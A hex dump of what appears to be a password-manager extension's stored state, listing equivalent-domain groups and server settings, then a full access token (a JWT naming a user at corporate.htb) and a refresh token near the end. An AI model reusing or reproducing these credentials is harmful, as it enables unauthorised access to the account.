00004650: 65 76 65 6E 74 62 72 69  74 65 2E 73 65 00 00 00  eventbrite.se...
00004660: 19 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00004670: 65 76 65 6E 74 62 72 69  74 65 2E 73 67 00 00 00  eventbrite.sg...
00004680: 00 00 00 00 13 00 FF FF  49 00 00 00 03 00 FF FF  ........I.......
00004690: 07 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
000046A0: 11 00 00 80 04 00 FF FF  73 74 61 63 6B 65 78 63  ........stackexc
000046B0: 68 61 6E 67 65 2E 63 6F  6D 00 00 00 00 00 00 00  hange.com.......
000046C0: 01 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
000046D0: 73 75 70 65 72 75 73 65  72 2E 63 6F 6D 00 00 00  superuser.com...
000046E0: 02 00 00 00 03 00 FF FF  11 00 00 80 04 00 FF FF  ................
000046F0: 73 74 61 63 6B 6F 76 65  72 66 6C 6F 77 2E 63 6F  stackoverflow.co
00004700: 6D 00 00 00 00 00 00 00  03 00 00 00 03 00 FF FF  m...............
00004710: 0F 00 00 80 04 00 FF FF  73 65 72 76 65 72 66 61  ........serverfa
00004720: 75 6C 74 2E 63 6F 6D 00  04 00 00 00 03 00 FF FF  ult.com.........
00004730: 10 00 00 80 04 00 FF FF  6D 61 74 68 6F 76 65 72  ........mathover
00004740: 66 6C 6F 77 2E 6E 65 74  05 00 00 00 03 00 FF FF  flow.net........
00004750: 0D 00 00 80 04 00 FF FF  61 73 6B 75 62 75 6E 74  ........askubunt
00004760: 75 2E 63 6F 6D 00 00 00  06 00 00 00 03 00 FF FF  u.com...........
00004770: 0D 00 00 80 04 00 FF FF  73 74 61 63 6B 61 70 70  ........stackapp
00004780: 73 2E 63 6F 6D 00 00 00  00 00 00 00 13 00 FF FF  s.com...........
00004790: 4A 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  J...............
000047A0: 00 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
000047B0: 64 6F 63 75 73 69 67 6E  2E 63 6F 6D 00 00 00 00  docusign.com....
000047C0: 01 00 00 00 03 00 FF FF  0C 00 00 80 04 00 FF FF  ................
000047D0: 64 6F 63 75 73 69 67 6E  2E 6E 65 74 00 00 00 00  docusign.net....
000047E0: 00 00 00 00 13 00 FF FF  4B 00 00 00 03 00 FF FF  ........K.......
000047F0: 08 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00004800: 0A 00 00 80 04 00 FF FF  65 6E 76 61 74 6F 2E 63  ........envato.c
00004810: 6F 6D 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  om..............
00004820: 0F 00 00 80 04 00 FF FF  74 68 65 6D 65 66 6F 72  ........themefor
00004830: 65 73 74 2E 6E 65 74 00  02 00 00 00 03 00 FF FF  est.net.........
00004840: 0E 00 00 80 04 00 FF FF  63 6F 64 65 63 61 6E 79  ........codecany
00004850: 6F 6E 2E 6E 65 74 00 00  03 00 00 00 03 00 FF FF  on.net..........
00004860: 0D 00 00 80 04 00 FF FF  76 69 64 65 6F 68 69 76  ........videohiv
00004870: 65 2E 6E 65 74 00 00 00  04 00 00 00 03 00 FF FF  e.net...........
00004880: 0F 00 00 80 04 00 FF FF  61 75 64 69 6F 6A 75 6E  ........audiojun
00004890: 67 6C 65 2E 6E 65 74 00  05 00 00 00 03 00 FF FF  gle.net.........
000048A0: 10 00 00 80 04 00 FF FF  67 72 61 70 68 69 63 72  ........graphicr
000048B0: 69 76 65 72 2E 6E 65 74  06 00 00 00 03 00 FF FF  iver.net........
000048C0: 0D 00 00 80 04 00 FF FF  70 68 6F 74 6F 64 75 6E  ........photodun
000048D0: 65 2E 6E 65 74 00 00 00  07 00 00 00 03 00 FF FF  e.net...........
000048E0: 0B 00 00 80 04 00 FF FF  33 64 6F 63 65 61 6E 2E  ........3docean.
000048F0: 6E 65 74 00 00 00 00 00  00 00 00 00 13 00 FF FF  net.............
00004900: 4C 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  L...............
00004910: 00 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00004920: 78 31 30 68 6F 73 74 69  6E 67 2E 63 6F 6D 00 00  x10hosting.com..
00004930: 01 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00004940: 78 31 30 70 72 65 6D 69  75 6D 2E 63 6F 6D 00 00  x10premium.com..
00004950: 00 00 00 00 13 00 FF FF  4D 00 00 00 03 00 FF FF  ........M.......
00004960: 03 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00004970: 0D 00 00 80 04 00 FF FF  64 6E 73 6F 6D 61 74 69  ........dnsomati
00004980: 63 2E 63 6F 6D 00 00 00  01 00 00 00 03 00 FF FF  c.com...........
00004990: 0B 00 00 80 04 00 FF FF  6F 70 65 6E 64 6E 73 2E  ........opendns.
000049A0: 63 6F 6D 00 00 00 00 00  02 00 00 00 03 00 FF FF  com.............
000049B0: 0C 00 00 80 04 00 FF FF  75 6D 62 72 65 6C 6C 61  ........umbrella
000049C0: 2E 63 6F 6D 00 00 00 00  00 00 00 00 13 00 FF FF  .com............
000049D0: 4E 00 00 00 03 00 FF FF  0D 00 00 00 07 00 FF FF  N...............
000049E0: 00 00 00 00 03 00 FF FF  12 00 00 80 04 00 FF FF  ................
000049F0: 63 61 67 72 65 61 74 61  6D 65 72 69 63 61 2E 63  cagreatamerica.c
00004A00: 6F 6D 00 00 00 00 00 00  01 00 00 00 03 00 FF FF  om..............
00004A10: 15 00 00 80 04 00 FF FF  63 61 6E 61 64 61 73 77  ........canadasw
00004A20: 6F 6E 64 65 72 6C 61 6E  64 2E 63 6F 6D 00 00 00  onderland.com...
00004A30: 02 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00004A40: 63 61 72 6F 77 69 6E 64  73 2E 63 6F 6D 00 00 00  carowinds.com...
00004A50: 03 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00004A60: 63 65 64 61 72 66 61 69  72 2E 63 6F 6D 00 00 00  cedarfair.com...
00004A70: 04 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00004A80: 63 65 64 61 72 70 6F 69  6E 74 2E 63 6F 6D 00 00  cedarpoint.com..
00004A90: 05 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00004AA0: 64 6F 72 6E 65 79 70 61  72 6B 2E 63 6F 6D 00 00  dorneypark.com..
00004AB0: 06 00 00 00 03 00 FF FF  11 00 00 80 04 00 FF FF  ................
00004AC0: 6B 69 6E 67 73 64 6F 6D  69 6E 69 6F 6E 2E 63 6F  kingsdominion.co
00004AD0: 6D 00 00 00 00 00 00 00  07 00 00 00 03 00 FF FF  m...............
00004AE0: 0A 00 00 80 04 00 FF FF  6B 6E 6F 74 74 73 2E 63  ........knotts.c
00004AF0: 6F 6D 00 00 00 00 00 00  08 00 00 00 03 00 FF FF  om..............
00004B00: 0F 00 00 80 04 00 FF FF  6D 69 61 64 76 65 6E 74  ........miadvent
00004B10: 75 72 65 2E 63 6F 6D 00  09 00 00 00 03 00 FF FF  ure.com.........
00004B20: 11 00 00 80 04 00 FF FF  73 63 68 6C 69 74 74 65  ........schlitte
00004B30: 72 62 61 68 6E 2E 63 6F  6D 00 00 00 00 00 00 00  rbahn.com.......
00004B40: 0A 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00004B50: 76 61 6C 6C 65 79 66 61  69 72 2E 63 6F 6D 00 00  valleyfair.com..
00004B60: 0B 00 00 00 03 00 FF FF  14 00 00 80 04 00 FF FF  ................
00004B70: 76 69 73 69 74 6B 69 6E  67 73 69 73 6C 61 6E 64  visitkingsisland
00004B80: 2E 63 6F 6D 00 00 00 00  0C 00 00 00 03 00 FF FF  .com............
00004B90: 0F 00 00 80 04 00 FF FF  77 6F 72 6C 64 73 6F 66  ........worldsof
00004BA0: 66 75 6E 2E 63 6F 6D 00  00 00 00 00 13 00 FF FF  fun.com.........
00004BB0: 4F 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  O...............
00004BC0: 00 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00004BD0: 75 62 6E 74 2E 63 6F 6D  01 00 00 00 03 00 FF FF  ubnt.com........
00004BE0: 06 00 00 80 04 00 FF FF  75 69 2E 63 6F 6D 00 00  ........ui.com..
00004BF0: 00 00 00 00 13 00 FF FF  50 00 00 00 03 00 FF FF  ........P.......
00004C00: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00004C10: 0E 00 00 80 04 00 FF FF  64 69 73 63 6F 72 64 61  ........discorda
00004C20: 70 70 2E 63 6F 6D 00 00  01 00 00 00 03 00 FF FF  pp.com..........
00004C30: 0B 00 00 80 04 00 FF FF  64 69 73 63 6F 72 64 2E  ........discord.
00004C40: 63 6F 6D 00 00 00 00 00  00 00 00 00 13 00 FF FF  com.............
00004C50: 51 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  Q...............
00004C60: 00 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00004C70: 6E 65 74 63 75 70 2E 64  65 00 00 00 00 00 00 00  netcup.de.......
00004C80: 01 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00004C90: 6E 65 74 63 75 70 2E 65  75 00 00 00 00 00 00 00  netcup.eu.......
00004CA0: 02 00 00 00 03 00 FF FF  17 00 00 80 04 00 FF FF  ................
00004CB0: 63 75 73 74 6F 6D 65 72  63 6F 6E 74 72 6F 6C 70  customercontrolp
00004CC0: 61 6E 65 6C 2E 64 65 00  00 00 00 00 13 00 FF FF  anel.de.........
00004CD0: 52 00 00 00 03 00 FF FF  16 00 00 00 07 00 FF FF  R...............
00004CE0: 00 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
00004CF0: 79 61 6E 64 65 78 2E 63  6F 6D 00 00 00 00 00 00  yandex.com......
00004D00: 01 00 00 00 03 00 FF FF  05 00 00 80 04 00 FF FF  ................
00004D10: 79 61 2E 72 75 00 00 00  02 00 00 00 03 00 FF FF  ya.ru...........
00004D20: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 61  ........yandex.a
00004D30: 7A 00 00 00 00 00 00 00  03 00 00 00 03 00 FF FF  z...............
00004D40: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 62  ........yandex.b
00004D50: 79 00 00 00 00 00 00 00  04 00 00 00 03 00 FF FF  y...............
00004D60: 0C 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 63  ........yandex.c
00004D70: 6F 2E 69 6C 00 00 00 00  05 00 00 00 03 00 FF FF  o.il............
00004D80: 0D 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 63  ........yandex.c
00004D90: 6F 6D 2E 61 6D 00 00 00  06 00 00 00 03 00 FF FF  om.am...........
00004DA0: 0D 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 63  ........yandex.c
00004DB0: 6F 6D 2E 67 65 00 00 00  07 00 00 00 03 00 FF FF  om.ge...........
00004DC0: 0D 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 63  ........yandex.c
00004DD0: 6F 6D 2E 74 72 00 00 00  08 00 00 00 03 00 FF FF  om.tr...........
00004DE0: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 65  ........yandex.e
00004DF0: 65 00 00 00 00 00 00 00  09 00 00 00 03 00 FF FF  e...............
00004E00: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 66  ........yandex.f
00004E10: 69 00 00 00 00 00 00 00  0A 00 00 00 03 00 FF FF  i...............
00004E20: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 66  ........yandex.f
00004E30: 72 00 00 00 00 00 00 00  0B 00 00 00 03 00 FF FF  r...............
00004E40: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 6B  ........yandex.k
00004E50: 67 00 00 00 00 00 00 00  0C 00 00 00 03 00 FF FF  g...............
00004E60: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 6B  ........yandex.k
00004E70: 7A 00 00 00 00 00 00 00  0D 00 00 00 03 00 FF FF  z...............
00004E80: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 6C  ........yandex.l
00004E90: 74 00 00 00 00 00 00 00  0E 00 00 00 03 00 FF FF  t...............
00004EA0: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 6C  ........yandex.l
00004EB0: 76 00 00 00 00 00 00 00  0F 00 00 00 03 00 FF FF  v...............
00004EC0: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 6D  ........yandex.m
00004ED0: 64 00 00 00 00 00 00 00  10 00 00 00 03 00 FF FF  d...............
00004EE0: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 70  ........yandex.p
00004EF0: 6C 00 00 00 00 00 00 00  11 00 00 00 03 00 FF FF  l...............
00004F00: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 72  ........yandex.r
00004F10: 75 00 00 00 00 00 00 00  12 00 00 00 03 00 FF FF  u...............
00004F20: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 74  ........yandex.t
00004F30: 6A 00 00 00 00 00 00 00  13 00 00 00 03 00 FF FF  j...............
00004F40: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 74  ........yandex.t
00004F50: 6D 00 00 00 00 00 00 00  14 00 00 00 03 00 FF FF  m...............
00004F60: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 75  ........yandex.u
00004F70: 61 00 00 00 00 00 00 00  15 00 00 00 03 00 FF FF  a...............
00004F80: 09 00 00 80 04 00 FF FF  79 61 6E 64 65 78 2E 75  ........yandex.u
00004F90: 7A 00 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  z...............
00004FA0: 53 00 00 00 03 00 FF FF  02 00 00 00 07 00 FF FF  S...............
00004FB0: 00 00 00 00 03 00 FF FF  1C 00 00 80 04 00 FF FF  ................
00004FC0: 73 6F 6E 79 65 6E 74 65  72 74 61 69 6E 6D 65 6E  sonyentertainmen
00004FD0: 74 6E 65 74 77 6F 72 6B  2E 63 6F 6D 00 00 00 00  tnetwork.com....
00004FE0: 01 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00004FF0: 73 6F 6E 79 2E 63 6F 6D  00 00 00 00 13 00 FF FF  sony.com........
00005000: 54 00 00 00 03 00 FF FF  03 00 00 00 07 00 FF FF  T...............
00005010: 00 00 00 00 03 00 FF FF  09 00 00 80 04 00 FF FF  ................
00005020: 70 72 6F 74 6F 6E 2E 6D  65 00 00 00 00 00 00 00  proton.me.......
00005030: 01 00 00 00 03 00 FF FF  0E 00 00 80 04 00 FF FF  ................
00005040: 70 72 6F 74 6F 6E 6D 61  69 6C 2E 63 6F 6D 00 00  protonmail.com..
00005050: 02 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00005060: 70 72 6F 74 6F 6E 76 70  6E 2E 63 6F 6D 00 00 00  protonvpn.com...
00005070: 00 00 00 00 13 00 FF FF  55 00 00 00 03 00 FF FF  ........U.......
00005080: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00005090: 0B 00 00 80 04 00 FF FF  75 62 69 73 6F 66 74 2E  ........ubisoft.
000050A0: 63 6F 6D 00 00 00 00 00  01 00 00 00 03 00 FF FF  com.............
000050B0: 07 00 00 80 04 00 FF FF  75 62 69 2E 63 6F 6D 00  ........ubi.com.
000050C0: 00 00 00 00 13 00 FF FF  56 00 00 00 03 00 FF FF  ........V.......
000050D0: 02 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
000050E0: 10 00 00 80 04 00 FF FF  74 72 61 6E 73 66 65 72  ........transfer
000050F0: 77 69 73 65 2E 63 6F 6D  01 00 00 00 03 00 FF FF  wise.com........
00005100: 08 00 00 80 04 00 FF FF  77 69 73 65 2E 63 6F 6D  ........wise.com
00005110: 00 00 00 00 13 00 FF FF  57 00 00 00 03 00 FF FF  ........W.......
00005120: 09 00 00 00 07 00 FF FF  00 00 00 00 03 00 FF FF  ................
00005130: 0C 00 00 80 04 00 FF FF  74 61 6B 65 61 77 61 79  ........takeaway
00005140: 2E 63 6F 6D 00 00 00 00  01 00 00 00 03 00 FF FF  .com............
00005150: 0B 00 00 80 04 00 FF FF  6A 75 73 74 2D 65 61 74  ........just-eat
00005160: 2E 64 6B 00 00 00 00 00  02 00 00 00 03 00 FF FF  .dk.............
00005170: 0B 00 00 80 04 00 FF FF  6A 75 73 74 2D 65 61 74  ........just-eat
00005180: 2E 6E 6F 00 00 00 00 00  03 00 00 00 03 00 FF FF  .no.............
00005190: 0B 00 00 80 04 00 FF FF  6A 75 73 74 2D 65 61 74  ........just-eat
000051A0: 2E 66 72 00 00 00 00 00  04 00 00 00 03 00 FF FF  .fr.............
000051B0: 0B 00 00 80 04 00 FF FF  6A 75 73 74 2D 65 61 74  ........just-eat
000051C0: 2E 63 68 00 00 00 00 00  05 00 00 00 03 00 FF FF  .ch.............
000051D0: 0D 00 00 80 04 00 FF FF  6C 69 65 66 65 72 61 6E  ........lieferan
000051E0: 64 6F 2E 64 65 00 00 00  06 00 00 00 03 00 FF FF  do.de...........
000051F0: 0D 00 00 80 04 00 FF FF  6C 69 65 66 65 72 61 6E  ........lieferan
00005200: 64 6F 2E 61 74 00 00 00  07 00 00 00 03 00 FF FF  do.at...........
00005210: 0F 00 00 80 04 00 FF FF  74 68 75 69 73 62 65 7A  ........thuisbez
00005220: 6F 72 67 64 2E 6E 6C 00  08 00 00 00 03 00 FF FF  orgd.nl.........
00005230: 09 00 00 80 04 00 FF FF  70 79 73 7A 6E 65 2E 70  ........pyszne.p
00005240: 6C 00 00 00 00 00 00 00  00 00 00 00 13 00 FF FF  l...............
00005250: 58 00 00 00 03 00 FF FF  06 00 00 00 07 00 FF FF  X...............
00005260: 00 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00005270: 61 74 6C 61 73 73 69 61  6E 2E 63 6F 6D 00 00 00  atlassian.com...
00005280: 01 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
00005290: 62 69 74 62 75 63 6B 65  74 2E 6F 72 67 00 00 00  bitbucket.org...
000052A0: 02 00 00 00 03 00 FF FF  0A 00 00 80 04 00 FF FF  ................
000052B0: 74 72 65 6C 6C 6F 2E 63  6F 6D 00 00 00 00 00 00  trello.com......
000052C0: 03 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
000052D0: 73 74 61 74 75 73 70 61  67 65 2E 69 6F 00 00 00  statuspage.io...
000052E0: 04 00 00 00 03 00 FF FF  0D 00 00 80 04 00 FF FF  ................
000052F0: 61 74 6C 61 73 73 69 61  6E 2E 6E 65 74 00 00 00  atlassian.net...
00005300: 05 00 00 00 03 00 FF FF  08 00 00 80 04 00 FF FF  ................
00005310: 6A 69 72 61 2E 63 6F 6D  00 00 00 00 13 00 FF FF  jira.com........
00005320: 00 00 00 00 13 00 FF FF  00 00 00 00 13 00 FF FF  ................
00005330: 0B 00 00 80 04 00 FF FF  61 76 61 74 61 72 43 6F  ........avatarCo
00005340: 6C 6F 72 00 00 00 00 00  00 00 00 00 00 00 FF FF  lor.............
00005350: 0C 00 00 80 04 00 FF FF  73 65 72 76 65 72 43 6F  ........serverCo
00005360: 6E 66 69 67 00 00 00 00  00 00 00 00 08 00 FF FF  nfig............
00005370: 07 00 00 80 04 00 FF FF  76 65 72 73 69 6F 6E 00  ........version.
00005380: 00 00 00 00 01 00 FF FF  07 00 00 80 04 00 FF FF  ................
00005390: 67 69 74 48 61 73 68 00  00 00 00 00 01 00 FF FF  gitHash.........
000053A0: 06 00 00 80 04 00 FF FF  73 65 72 76 65 72 00 00  ........server..
000053B0: 00 00 00 00 00 00 FF FF  07 00 00 80 04 00 FF FF  ................
000053C0: 75 74 63 44 61 74 65 00  18 00 00 80 04 00 FF FF  utcDate.........
000053D0: 32 30 32 33 2D 30 34 2D  31 33 54 31 35 3A 33 39  2023-04-13T15:39
000053E0: 3A 34 38 2E 35 36 30 5A  0B 00 00 80 04 00 FF FF  :48.560Z........
000053F0: 65 6E 76 69 72 6F 6E 6D  65 6E 74 00 00 00 00 00  environment.....
00005400: 00 00 00 00 00 00 FF FF  00 00 00 00 13 00 FF FF  ................
00005410: 00 00 00 00 13 00 FF FF  06 00 00 80 04 00 FF FF  ................
00005420: 74 6F 6B 65 6E 73 00 00  00 00 00 00 08 00 FF FF  tokens..........
00005430: 0B 00 00 80 04 00 FF FF  61 63 63 65 73 73 54 6F  ........accessTo
00005440: 6B 65 6E 00 00 00 00 00  A3 03 00 80 04 00 FF FF  ken.............
00005450: 65 79 4A 30 65 58 41 69  4F 69 4A 4B 56 31 51 69  eyJ0eXAiOiJKV1Qi
00005460: 4C 43 4A 68 62 47 63 69  4F 69 4A 53 55 7A 49 31  LCJhbGciOiJSUzI1
00005470: 4E 69 4A 39 2E 65 79 4A  75 59 6D 59 69 4F 6A 45  NiJ9.eyJuYmYiOjE
00005480: 32 4F 44 45 30 4D 44 41  30 4D 6A 6B 73 49 6D 56  2ODE0MDA0MjksImV
00005490: 34 63 43 49 36 4D 54 59  34 4D 54 51 77 4E 7A 59  4cCI6MTY4MTQwNzY
000054A0: 79 4F 53 77 69 61 58 4E  7A 49 6A 6F 69 61 48 52  yOSwiaXNzIjoiaHR
000054B0: 30 63 44 6F 76 4C 32 78  76 59 32 46 73 61 47 39  0cDovL2xvY2FsaG9
000054C0: 7A 64 48 78 73 62 32 64  70 62 69 49 73 49 6E 4E  zdHxsb2dpbiIsInN
000054D0: 31 59 69 49 36 49 6A 41  34 59 6A 4D 33 4E 54 46  1YiI6IjA4YjM3NTF
000054E0: 69 4C 57 46 68 5A 44 55  74 4E 44 59 78 4E 69 31  iLWFhZDUtNDYxNi1
000054F0: 69 4D 57 59 33 4C 54 41  78 4E 57 51 7A 59 6D 55  iMWY3LTAxNWQzYmU
00005500: 33 4E 44 6C 6B 59 69 49  73 49 6E 42 79 5A 57 31  3NDlkYiIsInByZW1
00005510: 70 64 57 30 69 4F 6E 52  79 64 57 55 73 49 6D 35  pdW0iOnRydWUsIm5
00005520: 68 62 57 55 69 4F 69 4A  46 62 48 64 70 62 69 42  hbWUiOiJFbHdpbiB
00005530: 4B 62 32 35 6C 63 79 49  73 49 6D 56 74 59 57 6C  Kb25lcyIsImVtYWl
00005540: 73 49 6A 6F 69 5A 57 78  33 61 57 34 75 61 6D 39  sIjoiZWx3aW4uam9
00005550: 75 5A 58 4E 41 59 32 39  79 63 47 39 79 59 58 52  uZXNAY29ycG9yYXR
00005560: 6C 4C 6D 68 30 59 69 49  73 49 6D 56 74 59 57 6C  lLmh0YiIsImVtYWl
00005570: 73 58 33 5A 6C 63 6D 6C  6D 61 57 56 6B 49 6A 70  sX3ZlcmlmaWVkIjp
00005580: 30 63 6E 56 6C 4C 43 4A  76 63 6D 64 76 64 32 35  0cnVlLCJvcmdvd25
00005590: 6C 63 69 49 36 57 31 30  73 49 6D 39 79 5A 32 46  lciI6W10sIm9yZ2F
000055A0: 6B 62 57 6C 75 49 6A 70  62 58 53 77 69 62 33 4A  kbWluIjpbXSwib3J
000055B0: 6E 64 58 4E 6C 63 69 49  36 57 31 30 73 49 6D 39  ndXNlciI6W10sIm9
000055C0: 79 5A 32 31 68 62 6D 46  6E 5A 58 49 69 4F 6C 74  yZ21hbmFnZXIiOlt
000055D0: 64 4C 43 4A 7A 63 33 52  68 62 58 41 69 4F 69 49  dLCJzc3RhbXAiOiI
000055E0: 34 59 7A 49 79 5A 6A 67  31 4F 53 30 77 4E 57 4E  4YzIyZjg1OS0wNWN
000055F0: 6B 4C 54 51 31 4E 44 41  74 4F 54 45 31 4D 53 31  kLTQ1NDAtOTE1MS1
00005600: 6C 4E 54 42 6C 5A 44 52  6D 4E 44 46 68 4D 54 63  lNTBlZDRmNDFhMTc
00005610: 69 4C 43 4A 6B 5A 58 5A  70 59 32 55 69 4F 69 4A  iLCJkZXZpY2UiOiJ
00005620: 6B 59 57 59 32 5A 54 51  77 4E 79 30 30 4D 7A 55  kYWY2ZTQwNy00MzU
00005630: 32 4C 54 52 6A 4D 6D 51  74 4F 44 64 6B 4E 69 30  2LTRjMmQtODdkNi0
00005640: 32 59 6A 52 6B 59 7A 6B  78 4E 54 55 79 4D 54 51  2YjRkYzkxNTUyMTQ
00005650: 69 4C 43 4A 7A 59 32 39  77 5A 53 49 36 57 79 4A  iLCJzY29wZSI6WyJ
00005660: 68 63 47 6B 69 4C 43 4A  76 5A 6D 5A 73 61 57 35  hcGkiLCJvZmZsaW5
00005670: 6C 58 32 46 6A 59 32 56  7A 63 79 4A 64 4C 43 4A  lX2FjY2VzcyJdLCJ
00005680: 68 62 58 49 69 4F 6C 73  69 51 58 42 77 62 47 6C  hbXIiOlsiQXBwbGl
00005690: 6A 59 58 52 70 62 32 34  69 58 58 30 2E 53 67 59  jYXRpb24iXX0.SgY
000056A0: 4A 4D 6F 69 42 6E 75 56  68 46 4D 53 45 6C 4A 30  JMoiBnuVhFMSElJ0
000056B0: 50 4A 64 7A 63 37 31 69  76 44 38 4B 64 58 6A 75  PJdzc71ivD8KdXju
000056C0: 59 65 41 43 4E 6F 69 62  6B 45 69 59 54 62 6D 67  YeACNoibkEiYTbmg
000056D0: 71 75 4C 67 59 7A 6A 35  69 33 75 59 70 4A 4B 57  quLgYzj5i3uYpJKW
000056E0: 38 51 34 7A 70 54 4C 64  68 37 6B 66 63 58 38 38  8Q4zpTLdh7kfcX88
000056F0: 78 51 43 52 47 30 55 4B  36 54 70 51 58 44 32 4B  xQCRG0UK6TpQXD2K
00005700: 69 4E 33 49 76 54 45 73  6D 67 6A 4F 44 4C 6F 7A  iN3IvTEsmgjODLoz
00005710: 56 50 5F 54 52 45 4C 42  43 77 33 68 66 67 4F 75  VP_TRELBCw3hfgOu
00005720: 69 61 67 63 6F 65 71 7A  46 51 46 48 6E 5A 39 70  iagcoeqzFQFHnZ9p
00005730: 52 57 32 33 45 4B 6A 43  56 59 74 49 53 34 71 74  RW23EKjCVYtIS4qt
00005740: 36 45 51 6A 49 7A 2D 7A  49 6A 4F 6C 6E 4F 7A 53  6EQjIz-zIjOlnOzS
00005750: 65 33 52 42 44 32 39 49  44 34 4D 51 37 37 72 46  e3RBD29ID4MQ77rF
00005760: 55 6E 54 5F 73 30 74 35  4F 4A 70 71 7A 41 62 47  UnT_s0t5OJpqzAbG
00005770: 6C 69 2D 7A 72 74 73 70  73 7A 30 5F 68 52 6C 69  li-zrtspsz0_hRli
00005780: 79 75 76 70 79 46 4A 4A  52 54 31 51 6C 33 2D 66  yuvpyFJJRT1Ql3-f
00005790: 46 38 70 72 35 55 5F 69  55 31 74 73 54 2D 31 75  F8pr5U_iU1tsT-1u
000057A0: 68 43 59 33 74 4F 5F 31  62 6C 57 6B 38 31 77 6B  hCY3tO_1blWk81wk
000057B0: 6B 6A 5A 58 37 35 42 67  41 58 39 59 6D 4E 6B 51  kjZX75BgAX9YmNkQ
000057C0: 74 47 52 31 31 4E 6B 5F  67 31 36 53 56 59 53 78  tGR11Nk_g16SVYSx
000057D0: 69 30 51 6B 72 42 51 30  43 46 64 51 69 4B 62 50  i0QkrBQ0CFdQiKbP
000057E0: 74 4F 47 68 57 75 63 37  34 37 5A 64 4D 62 66 57  tOGhWuc747ZdMbfW
000057F0: 59 56 77 00 00 00 00 00  0C 00 00 80 04 00 FF FF  YVw.............
00005800: 72 65 66 72 65 73 68 54  6F 6B 65 6E 00 00 00 00  refreshToken....
00005810: 58 00 00 80 04 00 FF FF  45 74 5A 4F 57 42 58 4D  X.......EtZOWBXM
00005820: 78 38 57 46 75 63 50 78  4E 55 67 35 2D 57 6D 2D  x8WFucPxNUg5-Wm-
00005830: 75 71 43 4B 2D 35 68 35  55 6A 62 30 37 41 54 34  uqCK-5h5Ujb07AT4
00005840: 36 68 6A 36 34 70 31 79  53 78 4D 4F 62 30 67 75  6hj64p1ySxMOb0gu
00005850: 73 4E 75 5F 31 4E 75 36  35 50 47 4E 54 59 65 32  sNu_1Nu65PGNTYe2
00005860: 48 53 33 55 57 79 6E 6B  54 6E 32 73 35 67 3D 3D  HS3UWynkTn2s5g==
00005870: 00 00 00 00 13 00 FF FF  09 00 00 80 04 00 FF FF  ................
00005880: 67 72 6F 75 70 69 6E 67  73 00 00 00 00 00 00 00  groupings.......
00005890: 00 00 00 00 08 00 FF FF  10 00 00 80 04 00 FF FF  ................
000058A0: 63 6F 6C 6C 65 63 74 69  6F 6E 43 6F 75 6E 74 73  collectionCounts
000058B0: 00 00 00 00 00 00 FF FF  0C 00 00 80 04 00 FF FF  ................
000058C0: 66 6F 6C 64 65 72 43 6F  75 6E 74 73 00 00 00 00  folderCounts....
000058D0: 00 00 00 00 00 00 FF FF  0A 00 00 80 04 00 FF FF  ................
000058E0: 74 79 70 65 43 6F 75 6E  74 73 00 00 00 00 00 00  typeCounts......
000058F0: 00 00 00 00 00 00 FF FF  0F 00 00 80 04 00 FF FF  ................
00005900: 66 61 76 6F 72 69 74 65  43 69 70 68 65 72 73 00  favoriteCiphers.
00005910: 00 00 00 00 01 00 FF FF  0F 00 00 80 04 00 FF FF  ................
00005920: 6E 6F 46 6F 6C 64 65 72  43 69 70 68 65 72 73 00  noFolderCiphers.
00005930: 00 00 00 00 01 00 FF FF  07 00 00 80 04 00 FF FF  ................
00005940: 63 69 70 68 65 72 73 00  00 00 00 00 01 00 FF FF  ciphers.........
